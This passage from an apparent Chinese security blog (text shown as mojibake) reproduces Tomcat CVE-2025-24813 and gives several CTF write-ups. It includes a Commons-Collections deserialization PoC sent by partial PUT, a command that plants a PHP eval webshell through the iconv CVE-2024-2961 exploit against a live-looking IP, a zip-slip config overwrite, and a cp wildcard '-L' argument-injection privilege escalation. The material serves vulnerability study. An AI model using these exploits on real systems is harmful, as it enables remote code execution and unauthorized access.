r\u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt;\r\u0026lt;/servlet\u0026gt; å¼€å¯æŒä¹…åŒ–é“¾æ¥æ–‡ä»¶æ¨¡å¼\ntomcatç›®å½•/conf/context.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\r\u0026lt;!--\rLicensed to the Apache Software Foundation (ASF) under one or more\rcontributor license agreements. See the NOTICE file distributed with\rthis work for additional information regarding copyright ownership.\rThe ASF licenses this file to You under the Apache License, Version 2.0\r(the \u0026#34;License\u0026#34;); you may not use this file except in compliance with\rthe License. You may obtain a copy of the License at\rhttp://www.apache.org/licenses/LICENSE-2.0\rUnless required by applicable law or agreed to in writing, software\rdistributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS,\rWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\rSee the License for the specific language governing permissions and\rlimitations under the License.\r--\u0026gt;\r\u0026lt;!-- The contents of this file will be loaded for each web application --\u0026gt;\r\u0026lt;Context\u0026gt;\r\u0026lt;!-- Default set of monitored resources. If one of these changes, the --\u0026gt;\r\u0026lt;!-- web application will be reloaded. --\u0026gt;\r\u0026lt;WatchedResource\u0026gt;WEB-INF/web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;WatchedResource\u0026gt;WEB-INF/tomcat-web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;WatchedResource\u0026gt;${catalina.base}/conf/web.xml\u0026lt;/WatchedResource\u0026gt;\r\u0026lt;!-- Uncomment this to disable session persistence across Tomcat restarts --\u0026gt;\r\u0026lt;!--\r\u0026lt;Manager pathname=\u0026#34;\u0026#34; /\u0026gt;\r--\u0026gt;\r\u0026lt;Manager className=\u0026#34;org.apache.catalina.session.PersistentManager\u0026#34;\rdebug=\u0026#34;0\u0026#34;\rsaveOnRestart=\u0026#34;false\u0026#34;\rmaxActiveSession=\u0026#34;-1\u0026#34;\rminIdleSwap=\u0026#34;-1\u0026#34;\rmaxIdleSwap=\u0026#34;-1\u0026#34;\rmaxIdleBackup=\u0026#34;-1\u0026#34;\u0026gt;\r\u0026lt;Store className=\u0026#34;org.apache.catalina.session.FileStore\u0026#34; directory=\u0026#34;\u0026#34;/\u0026gt;\r\u0026lt;/Manager\u0026gt;\r\u0026lt;/Context\u0026gt; å¾€pom.xmlä¸‹å¡å…¥CCä¾èµ–\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; æ¼æ´å¤ç° å¼€å¯æœåŠ¡\nç„¶åè·‘ä¸ªccçš„poc\npackage org.example;\rimport org.apache.commons.collections.Transformer;\rimport org.apache.commons.collections.functors.ChainedTransformer;\rimport org.apache.commons.collections.functors.ConstantTransformer;\rimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport java.io.*;\rimport java.lang.annotation.Target;\rimport java.util.*;\rimport java.lang.reflect.*;\rpublic class Main {\rpublic static void main(String[] args) throws Exception {\rString cmd=\u0026#34;open -a calculator\u0026#34;;\rTransformer[] transformers =new Transformer[]{\rnew ConstantTransformer(Runtime.class),\rnew InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[0]}),\rnew InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),\rnew InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{cmd})\r};\rChainedTransformer chainedTransformer=new ChainedTransformer(transformers);\rHashMap hsmap=new HashMap();\rhsmap.put(\u0026#34;value\u0026#34;,\u0026#34;test\u0026#34;);\rMap transformedMap=TransformedMap.decorate(hsmap,null,chainedTransformer);\rClass aclass=Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor constructor=aclass.getDeclaredConstructor(Class.class,Map.class);\rconstructor.setAccessible(true);\rObject handler = constructor.newInstance(Target.class,transformedMap);\rFileOutputStream bao=new FileOutputStream(\u0026#34;ser\u0026#34;);\rObjectOutputStream oos=new ObjectOutputStream(bao);\roos.writeObject(handler);\roos.close();\r}\r} å¾—åˆ°seræ–‡ä»¶ä¹‹åå†è·‘ä¸‹é¢è„šæœ¬\nimport requests\rdata=open(\u0026#34;ser\u0026#34;,\u0026#34;rb\u0026#34;).read()\rheaders={\u0026#34;Content-Range\u0026#34;:\u0026#34;bytes 0-10000/67589\u0026#34;}\rurl=\u0026#34;http://127.0.0.1:8081/evil/session\u0026#34;\rrequests.put(url,headers=headers,data=data)\rrequests.get(url,headers={\u0026#34;Cookie\u0026#34;:\u0026#34;JSESSIONID=.evil\u0026#34;}) åŸç†åˆ†æ å…¶ä¸€ æ¼æ´ç‚¹åœ¨DefaultServletä¸‹çš„doPutæ–¹æ³•ä¸­è°ƒç”¨ executePartialPutæ–¹æ³•\nåœ¨ executePartialPutæ–¹æ³•ä¸­,æ ¹æ®ä¼ å…¥çš„pathï¼Œrequeståˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œä¿å­˜åœ°å€ä¸ºå½“å‰ServletContextä¸‹çš„ä¸´æ—¶æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸”å°†pathä¸­çš„/è½¬åŒ–ä¸ºäº†.\nprotected File executePartialPut(HttpServletRequest req, Range range, String path) throws IOException {\r// Append data specified in ranges to existing content for this\r// resource - create a temp. file on the local filesystem to\r// perform this operation\rFile tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);\r// Convert all \u0026#39;/\u0026#39; characters to \u0026#39;.\u0026#39; in resourcePath\rString convertedResourcePath = path.replace(\u0026#39;/\u0026#39;, \u0026#39;.\u0026#39;);\rFile contentFile = new File(tempDir, convertedResourcePath);\rif (contentFile.createNewFile()) {\r// Clean up contentFile when Tomcat is terminated\rcontentFile.deleteOnExit();\r}\rtry (RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, \u0026#34;rw\u0026#34;)) {\rWebResource oldResource = resources.getResource(path);\r// Copy data in oldRevisionContent to contentFile\rif (oldResource.isFile()) {\rtry (BufferedInputStream bufOldRevStream =\rnew BufferedInputStream(oldResource.getInputStream(), BUFFER_SIZE)) {\rint numBytesRead;\rbyte[] copyBuffer = new byte[BUFFER_SIZE];\rwhile ((numBytesRead = bufOldRevStream.read(copyBuffer)) != -1) {\rrandAccessContentFile.write(copyBuffer, 0, numBytesRead);\r}\r}\r}\rrandAccessContentFile.setLength(range.length);\r// Append data in request input stream to contentFile\rrandAccessContentFile.seek(range.start);\rint numBytesRead;\rbyte[] transferBuffer = new byte[BUFFER_SIZE];\rtry (BufferedInputStream requestBufInStream = new BufferedInputStream(req.getInputStream(), BUFFER_SIZE)) {\rwhile ((numBytesRead = requestBufInStream.read(transferBuffer)) != -1) {\rrandAccessContentFile.write(transferBuffer, 0, numBytesRead);\r}\r}\r}\rreturn contentFile;\r} åœ¨è°ƒç”¨executePartialPutä¹‹å‰æœ‰ä¸ªè¦æ±‚ï¼Œéœ€è¦æˆ‘ä»¬çš„rangeä¸ä¸ºç©ºæˆ–IGNORE,å…¶å®å°±æ˜¯éœ€è¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåˆæ³•çš„Content-Rangeè¯·æ±‚å¤´ä¾¿å¯ä»¥æˆåŠŸåˆ›å»º\nprotected Range parseContentRange(HttpServletRequest request, HttpServletResponse response) throws IOException {\r// Retrieving the content-range header (if any is specified\rString contentRangeHeader = request.getHeader(\u0026#34;Content-Range\u0026#34;);\rif (contentRangeHeader == null) {\rreturn IGNORE;\r}\rif (!allowPartialPut) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\rContentRange contentRange = ContentRange.parse(new StringReader(contentRangeHeader));\rif (contentRange == null) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\r// bytes is the only range unit supported\rif (!contentRange.getUnits().equals(\u0026#34;bytes\u0026#34;)) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\r// TODO: Remove the internal representation and use Ranges\r// Convert to internal representation\rRange range = new Range();\rrange.start = contentRange.getStart();\rrange.end = contentRange.getEnd();\rrange.length = contentRange.getLength();\rif (!range.validate()) {\rresponse.sendError(HttpServletResponse.SC_BAD_REQUEST);\rreturn null;\r}\rreturn range;\r} æˆ‘è¿™é‡ŒæˆåŠŸputä¹‹åï¼Œç¼“å­˜æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹ä½äºapache-tomcat-9.0.85-src/work/Catalina/localhost/ROOTï¼Œ\nå…¶äºŒ sessionæ–‡ä»¶çš„é»˜è®¤å­˜å‚¨ç‚¹æ­£å¥½ä½äºå½“å‰Contextçš„ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹\nFileStore.load\nç”¨æˆ·åœ¨ä½¿ç”¨JSESSIONID=idçš„æƒ…å†µä¸‹è®¿é—®æœåŠ¡ï¼ŒFileStoreä¼šè‡ªåŠ¨çš„å»ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾åå­—ä¸ºid.sessionçš„æ–‡ä»¶å¹¶ä¸”è¿›è¡Œååºåˆ—åŒ–æ“ä½œ æ‰€ä»¥æ”»å‡»æ€è·¯å°±ä¸²è”èµ·æ¥äº†\næ”»å‡»è€…é€šè¿‡partialPutæ–¹æ³•å¾€æœåŠ¡ä¸´æ—¶æ–‡ä»¶å¤¹å¡å…¥å­˜æœ‰ååºåˆ—åŒ–æ•°æ®çš„æ–‡ä»¶ æ”»å‡»è€…å†æ¬¡æ„é€ JSESSIONIDä¸º.filename.sessionçš„è¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ”»å‡» ä¿¡æ¯æ³„éœ²\u0026amp;ç¯¡æ”¹ è¿™é‡Œæˆ‘çœ‹äº†ä¸€ä¼šå„¿æ²¡æ€è€ƒå‡ºæ¥è¿™ä¸ªä¿¡æ¯æ³„æ¼çš„æ‰‹æ³•ï¼Œè®²è®²æˆ‘åœ¨æ€è€ƒè¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›å¯ç–‘ç‚¹å§(æ–¹å‘ä¸ä¿è¯å¯¹)\nåœ¨æˆ‘ä»¬åˆ›å»ºäº†rangeçš„æƒ…å†µä¸‹ï¼Œä¸‹æ–¹è¿™ä¸ªifåˆ†æ”¯è¯­å¥ä¸‹æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œä¸¤ç«¯ä»£ç ï¼Œä¸€ä¸ªæ˜¯PartialPutæ–¹æ³•ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æ ¹æ®contentFileæ¥åˆ›å»ºä¸€ä¸ª\nä¸åŒäºresourceInputStream = req.getInputStream();çš„ç›´æ¥ä»reqä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥å†…å®¹ï¼Œè¿™é‡Œçš„æ˜¯æ ¹æ®æˆ‘ä»¬çš„è·¯å¾„å¯»æ‰¾å¯¹åº”æ–‡ä»¶ä¸‹çš„å†…å®¹\nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬putçš„è·¯å¾„ä¹Ÿå¹¶éæ˜¯éœ€è¦æ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå­˜åœ¨çš„æ–‡ä»¶æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰§è¡ŒpartialPutæ–¹æ³•ï¼Œæ–¹æ³•ä¼šæ ¹æ®æˆ‘ä»¬çš„Content-Rangeå¤´æ¥è®²æˆ‘ä»¬putçš„bodyå†…å®¹è¦†ç›–å¯¹åº”rangeçš„æ•°æ®ï¼Œè¿™é‡Œç®€å•å±•ç¤ºä¸€ä¸‹\nè®¿é—®å·²å­˜åœ¨çš„123æ–‡ä»¶\nput 123æ–‡ä»¶ å†…å®¹ä¸º66 rangeä¸ºContent-Range:bytes 200-1000/67589(rangeéšä¾¿è®¾çš„ï¼Œæˆ‘è¿™ä¸ªæ–‡ä»¶é•¿åº¦æ²¡è¿™ä¹ˆé•¿ï¼Œè¿™é‡Œæƒ…å†µæ˜¯è¦†ç›–æœ€ånä½ç­‰åŒäºæˆ‘ä»¬çš„putè¿›çš„å†…å®¹)\nç°åœ¨çœ‹ä¸€çœ¼123\næ‰€ä»¥è¯´partialPutæ–¹æ³•è¯»å–äº†ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹çš„å¯¹åº”æ–‡ä»¶å†…å®¹\néšåresourceInputStreamè¿›å…¥äº†resources.writeæ–¹æ³•,è¿™ä¸ªæ–¹æ³•ä¸‹æœ‰ä¸ªæ³¨é‡Šæœ‰ç‚¹æ€ª\nè¿™ä¸ªcacheå¥½åƒæ˜¯ç”¨æ¥ç»™æ­£åœ¨ä¸Šä¼ çš„æ–‡ä»¶åŠ é”çš„ï¼Ÿæ²¡æœ‰è¢«removeçš„è¯æ— æ³•è¢«è®¿é—®çš„æ ·å­\nè¿™é‡Œæœ‰è¿™ä¹ˆäº›æ–‡ä»¶åœ°å€\nä½†æ˜¯åé¢æˆ‘è‡ªå·±æµ‹è¯•ï¼Œå‘ç°å°±ç®—åœ¨è¿™ä¸ªcacheé‡Œå¥½åƒä¹Ÿèƒ½è®¿é—®ï¼Œä¸çŸ¥é“å•¥åŸå› äº†(æ™•)\né‚£æˆ‘å…¶å®å¯¹æ­¤å¤§è‡´çš„æ€è·¯å°±æœ‰ä¸¤ç§\né€šè¿‡æŸäº›æŠ¥é”™å°†resourceInputStreamçš„å†…å®¹å¸¦å‡ºæ¥ï¼Œé€ æˆæ³„æ¼ (æˆ‘çš„è¿™ä¸ªcacheç¯å¢ƒæœ‰é—®é¢˜çš„æƒ…å†µä¸‹QAQ)åœ¨cacheä¸­çš„æ–‡ä»¶è·¯å¾„æ— æ³•è®¿é—®ï¼Œä¸”æ•æ„Ÿæ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹çš„å­ç›®å½•(æ–‡ä»¶)ä¸­ï¼Œé€šè¿‡æˆ‘ä»¬æ¶æ„çš„å¾€å¯¹åº”è·¯å¾„æ„é€ putè¯·æ±‚ï¼Œå°†è¯¥æ•æ„Ÿæ–‡ä»¶ä»cacheä¸­removeæ‰ï¼Œä»è€Œèƒ½å¤Ÿè®¿é—®è¿™ä¸ªæ•æ„Ÿæ–‡ä»¶(ä¸è¿‡WEB-INFå’ŒMATA-INFè¿˜æ˜¯è®¿é—®ä¸åˆ°ï¼Œtomcatå·²ç»ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ä¸å‡†ä»¥è¿™ä¿©ç©æ„å¼€å¤´äº†) ç»“å°¾ åªå¤ç°å‡ºæ¥äº†RCEçš„æ´ï¼Œç®€å•æäº†ä¸€ä¸‹æˆ‘åœ¨ä¿¡æ¯æ³„éœ²è¿™æ–¹é¢çš„ä¸€äº›æ€è·¯ï¼Œå¦‚æœæ–‡ç« å†…å®¹æœ‰é”™è¯¯è¿˜è¯·å¸ˆå‚…è”ç³»æˆ‘çº æ­£ğŸ˜­~\n","date":"2025-03-12T18:00:00+08:00","permalink":"http://localhost:1313/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","section":"post","tags":null,"title":"[Tomcat]CVE-2025-24813å¤ç°åŠåŸç†åˆ†æ"},{"categories":["WP"],"contents":"Gavatar ä¸€ä¸ªphpæœåŠ¡\nè¿™é‡Œçœ‹upload.phpæœ‰ç€å¾ˆæ˜æ˜¾çš„ä»»æ„æ–‡ä»¶è¯»çš„æ¼æ´ï¼Œåªéœ€è¦postä¸€ä¸ªurlå‚æ•°å°±å¯ä»¥\nif (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } flagä¹Ÿä¸èƒ½ç›´æ¥è¯»ï¼Œéœ€è¦rceè°ƒç”¨/readflagï¼Œç„¶åå°±å¼€å§‹æƒ³èƒ½ä¸èƒ½å’Œå…¶ä»–phpæ–‡ä»¶ä¸‹çš„æ¼æ´ä¸€èµ·åˆ©ç”¨\nä¹Ÿæ˜¯æ²¡æœ‰å…¶ä»–èƒ½å¤Ÿæ¥ç€åˆ©ç”¨çš„æ¼æ´äº†ï¼Œç„¶åçœ‹åˆ°phpç‰ˆæœ¬æ˜¯8.3.4ï¼Œå°±æƒ³åˆ°é‚£ä¸ªiconvçš„æ¼æ´åˆ©ç”¨\nhttps://www.ambionics.io/blog/iconv-cve-2024-2961-p1\nå› ä¸ºä¸æ˜¯ç›´æ¥è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬ä»avatar.phpä¸­è·å–ï¼Œè¿™é‡Œéœ€è¦ç¨å¾®æ”¹ä¸€ä¸‹è„šæœ¬ä¸­çš„downloadå‡½æ•°ï¼Œè¦æå‰æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åæŠŠsessionå’Œuserå¡«ä¸Šå³å¯\ndef download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://39.106.16.204:20871/avatar.php?user=123\u0026#34;) print(response) data = response.text return base64.decode(data) ç„¶åè·‘expå°±å¥½äº†\npython test.py http://39.106.16.204:20871/upload.php \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[0]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; tarefik goæœåŠ¡ï¼Œä»£ç å¾ˆå°‘ï¼Œåªæœ‰ä¸€ä¸ªmain.go,è¿™é‡Œå¯ä»¥çœ‹åˆ°ç›´æ¥å†™äº†ä¸€ä¸ªflagæ¥å£è·å–flag\nr.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»Dockerfileé‡Œé¢çœ‹åˆ°å®é™…ä¸Šå¹¶ä¸æ˜¯ç›´æ¥å°†æœåŠ¡æš´éœ²åœ¨å¤–ç½‘ï¼Œè€Œæ˜¯ä½¿ç”¨äº†tarefikè¿›è¡Œäº†ä¸€ä¸ªä»£ç†è½¬å‘\ntraefik.yml\nproviders: file: filename: /app/.config/dynamic.yml entrypoints: web: address: \u0026#34;:80\u0026#34; dynamic.yml\nhttp: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy åªè½¬å‘äº†indexå’Œuploadä¸¤ä¸ªæ¥å£\næˆ‘ä»¬è¿™é‡Œå¯ä»¥ä»å®˜æ–¹æ–‡æ¡£çŸ¥é“ï¼Œè½¬å‘ç«¯å£è¿™ä¸€äº›çš„æœåŠ¡é…ç½®ï¼Œéƒ½æ˜¯å¯ä»¥çƒ­åŠ è½½çš„\né‚£æˆ‘ä»¬æ¥ä¸‹æ¥çš„ç›®çš„å°±æ˜¯æƒ³èƒ½å¦å¯ä»¥é‡å†™dynamic.ymlï¼Œå†™å…¥æˆ‘ä»¬çš„é…ç½®ï¼Œå°†flagç«¯å£è½¬å‘å‡ºæ¥å°±èƒ½è¾¾åˆ°getflag\næˆ‘ä»¬å°†ç›®å…‰è½¬åˆ°uploadæ¥å£ä¸Š\nr.POST(\u0026#34;/public/upload\u0026#34;, func(c *gin.Context) { file, err := c.FormFile(\u0026#34;file\u0026#34;) if err != nil { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;File upload failed\u0026#34;}) return } randomFolder := randFileName() destDir := filepath.Join(uploadDir, randomFolder) if err := os.MkdirAll(destDir, 0755); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to create directory\u0026#34;}) return } zipFilePath := filepath.Join(uploadDir, randomFolder+\u0026#34;.zip\u0026#34;) if err := c.SaveUploadedFile(file, zipFilePath); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to save uploaded file\u0026#34;}) return } if err := unzipFile(zipFilePath, destDir); err != nil { c.JSON(500, gin.H{\u0026#34;error\u0026#34;: \u0026#34;Failed to unzip file\u0026#34;}) return } c.JSON(200, gin.H{ \u0026#34;message\u0026#34;: fmt.Sprintf(\u0026#34;File uploaded and extracted successfully to %s\u0026#34;, destDir), }) }) unzipFile\nfunc unzipFile(zipPath, destDir string) error { zipReader, err := zip.OpenReader(zipPath) if err != nil { return err } defer zipReader.Close() for _, file := range zipReader.File { filePath := filepath.Join(destDir, file.Name) if file.FileInfo().IsDir() { if err := os.MkdirAll(filePath, file.Mode()); err != nil { return err } } else { err = unzipSimpleFile(file, filePath) if err != nil { return err } } } return nil } è¿™é‡Œéœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åæ”¾åˆ°unzipFileå‡½æ•°ä¸‹è¿›è¡Œä¸€ä¸ªè§£å‹\nçœ‹åˆ°unzipFileä¸­ä½¿ç”¨äº†filepath.Joinåï¼Œè”æƒ³åˆ°äº†pythoné‡Œçš„path.joinï¼Œæƒ³ç€èƒ½å¦æŠŠå‹ç¼©åŒ…å†…çš„æ–‡ä»¶åå†™æˆ../å¼€å¤´çš„å½¢å¼ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½æˆåŠŸç›®å½•ç©¿è¶Šï¼Œç„¶åè¦†ç›–é…ç½®æ–‡ä»¶äº†\nå°è¯•å‡ºæ¥æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œæˆ‘å†™äº†ä¸ªpythonè„šæœ¬æ¥è¾¾åˆ°ç›®çš„\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary=open(\u0026#34;config/dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() zipFile = zipfile.ZipFile(\u0026#34;test2.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test2.zip\u0026#34;) zipFile.writestr(\u0026#34;../../.config/dynamic.yml\u0026#34;, binary) zipFile.writestr(\u0026#34;1234.txt\u0026#34;,binary) zipFile.close() except IOError as e: raise e ç„¶ådynamic.ymlå†…å®¹å¦‚ä¸‹,ç”±äºXFFå¤´çš„å­˜åœ¨ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é¢å¤–åŠ ä¸€ä¸ªæ·»åŠ è¯·æ±‚å¤´çš„ä¸­é—´ä»¶\nhttp: middlewares: # å®šä¹‰æ·»åŠ è¯·æ±‚å¤´çš„ä¸­é—´ä»¶ add-headers: headers: customRequestHeaders: X-Forwarded-For: 127.0.0.1 services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy middlewares: - add-headers # åº”ç”¨ä¸­é—´ä»¶ upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy middlewares: - add-headers # åº”ç”¨ä¸­é—´ä»¶ flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - add-headers backup åœ¨htmlçš„æœ€ä¸‹é¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ³¨é‡Š\nç„¶åæˆ‘ä»¬ç®€å•ç»•ä¸€ä¸‹éæ³•ä¼ å‚åå°±å¯ä»¥äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªshellæ¥å£ï¼Œæˆ‘ä»¬èƒ½å¤Ÿç›´æ¥å‘å‘½ä»¤,æ‰€ä»¥è¿™é‡Œå¼¹ä¸ªshellæ–¹ä¾¿æ¥ä¸‹æ¥çš„æ“ä½œ\nflagæ˜¯400æƒé™ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦ææƒ\næ ¹ç›®å½•ä¸‹é¢å‘ç°äº†ä¸€ä¸ªbackup.shï¼Œå†…å®¹å¦‚ä¸‹\n#!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done ä¸€ä¸ªæ­»å¾ªç¯ï¼Œé‡å¤è¿›è¡Œäº†cp chmodçš„æ“ä½œ\nè¿™é‡Œæˆ‘å»ps auxçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯rootä¸€ç›´åœ¨æ‰§è¡Œ é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯åœ¨è¿™ä¸ªbackup.shä¸Šåšä¸‹ä¸€æ­¥æ“ä½œäº†\næˆ‘ä»¬æƒ³è¦çš„æ˜¯èƒ½å¦åœ¨primaryç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘/flagçš„è½¯è¿æ¥ï¼Œç„¶åcpå°†è½¯è¿æ¥æ‰€æŒ‡å‘çš„flagæ–‡ä»¶å¤åˆ¶åˆ°backupæ–‡ä»¶å¤¹ä¸‹ï¼Œå†åˆ©ç”¨å†…éƒ¨è‡ªå¸¦çš„chmodå‘½ä»¤ä½¿æˆ‘ä»¬å¯è¯»\nä½†æ˜¯è¿™é‡Œcpä½¿ç”¨äº†-På‚æ•°ï¼Œåœ¨helpä¸­å¯¹è¯¥å‚æ•°è§£é‡Šå¦‚ä¸‹\n-P, --no-dereference never follow symbolic links in SOURC è¿™ä¸æ˜¯å¯„äº†å—?\nä½†æ˜¯cpçš„å¯¹è±¡æ˜¯*å‚æ•°ï¼Œè¿™ä¸ª*å‚æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ³¨å…¥å‚æ•°é¡¹(ä¸€äº›å‘½ä»¤çš„ææƒæ‰‹æ³•å°±æ˜¯ç”¨åˆ°è¿™ä¸ªæ“ä½œæ¯”å¦‚chmod tarç­‰ç­‰,ä¸äº†è§£çš„å¯ä»¥ä¸Šç½‘æœæœ)\næˆ‘ä»¬æƒ³è¦çš„å‚æ•°é¡¹æ˜¯è¿™ä¸ª,å…è®¸å¤åˆ¶è½¯è¿æ¥æ‰€å¯¹åº”çš„æ–‡ä»¶\n-L, --dereference always follow symbolic links in SOURCE ç”±äºä¸¤ä¸ªç›¸åçš„å‚æ•°ä¼šè¢«ä½ç½®è¾ƒåçš„å‚æ•°æ‰€è¦†ç›–ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸º-Lçš„æ–‡ä»¶ åˆ›å»ºæŒ‡å‘flagçš„è½¯è¿æ¥ ç­‰shæ‰§è¡Œ cat flag å‘½ä»¤å¦‚ä¸‹\ncd /var/www/html/primary \u0026gt;-L ln -s /flag flag cd ../backup cat flag EasyDB æœåŠ¡ç»™æˆ‘ä»¬çš„æœ‰ç”¨æ¥å£åªæœ‰ä¸€ä¸ªç™»é™†æ¥å£\n@PostMapping({\u0026#34;/login\u0026#34;}) public String handleLogin(@RequestParam String username, @RequestParam String password, HttpSession session, Model model) throws SQLException { if (this.userService.validateUser(username, password)) { session.setAttribute(\u0026#34;username\u0026#34;, username); return \u0026#34;redirect:/\u0026#34;; } else { model.addAttribute(\u0026#34;error\u0026#34;, \u0026#34;Invalid username or password\u0026#34;); return \u0026#34;login\u0026#34;; } } validateUserä¸­å­˜åœ¨ç€sqlæ³¨å…¥æ¼æ´\npublic boolean validateUser(String username, String password) throws SQLException { String query = String.format(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;%s\u0026#39; AND password = \u0026#39;%s\u0026#39;\u0026#34;, username, password); if (!SecurityUtils.check(query)) { return false; } else { Throwable var8; try (Statement stmt = this.connection.createStatement()) { stmt.executeQuery(query); ResultSet resultSet = stmt.getResultSet(); Throwable var7 = null; try { var8 = resultSet.next(); } catch (Throwable var31) { var8 = var31; var7 = var31; throw var31; } finally { if (resultSet != null) { if (var7 != null) { try { resultSet.close(); } catch (Throwable var30) { var7.addSuppressed(var30); } } else { resultSet.close(); } } } } return 